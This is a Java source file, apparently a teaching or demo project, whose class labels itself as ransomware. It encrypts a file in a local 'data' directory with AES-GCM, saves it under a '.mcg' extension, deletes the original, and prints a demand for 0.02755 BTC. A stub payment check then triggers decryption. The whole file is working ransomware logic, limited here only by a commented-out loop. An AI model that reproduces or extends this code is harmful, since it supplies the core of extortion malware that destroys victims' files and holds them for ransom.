package report;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class Report implements IReport{
    // AES - Cryptography Params
    private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
    private static final int TAG_LENGTH_BIT = 128;
    private static final int IV_LENGTH_BYTE = 12;
    private static final int AES_KEY_BIT = 256;
    private static final Charset UTF_8 = StandardCharsets.UTF_8;
    private SecretKey secretKey;
    private byte[] nonce;

    private boolean isEncrypted;

    // Ransomware Params
    private File directory;
    private double ransomAmount;


    public Report() {
        this.isEncrypted = false;

        // Path of dedicated directory
        this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));

        try {
            this.nonce = AESCryptoUtils.getRandomNonce(IV_LENGTH_BYTE);
            this.secretKey = AESCryptoUtils.getAESKey();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void checkPayment() throws Exception {

        System.out.println("transaction successful! Your files will be decrypted.");
        startDecryption();
    }

    @Override
    public void startEncryption() throws Exception {
        if (!isEncrypted) {

            // Arraylist of all files in said directory
            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
                if (!fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for encryption
            //for (File f : files) {
            File f = files.get(0);
                byte[] decrFile = readContentIntoByteArray(f);
                byte[] encrFile = encrypt(decrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath() + ".mcg")) {
                    fos.write(encrFile);
                }

                f.delete();
            //}

            isEncrypted = true;
            System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
        }
    }

    @Override
    public void startDecryption() throws Exception {
        if (isEncrypted) {

            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
                if (fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for decryption
            for (File f : files) {
                byte[] encrFile = readContentIntoByteArray(f);
                byte[] decrFile = decrypt(encrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath().split(".mcg")[0])) {
                    fos.write(decrFile);
                }

                f.delete();
            }
            isEncrypted = false;
        }
    }


    public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(pText);
    }


    public static byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(cText);
    }


    private static byte[] readContentIntoByteArray(File file)
    {
        FileInputStream fileInputStream;
        byte[] bFile = new byte[(int) file.length()];
        try
        {
            //convert file into byte[]
            fileInputStream = new FileInputStream(file);
            fileInputStream.read(bFile);
            fileInputStream.close();
            for (byte b : bFile) {
                System.out.print((char) b);
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return bFile;
    }
}
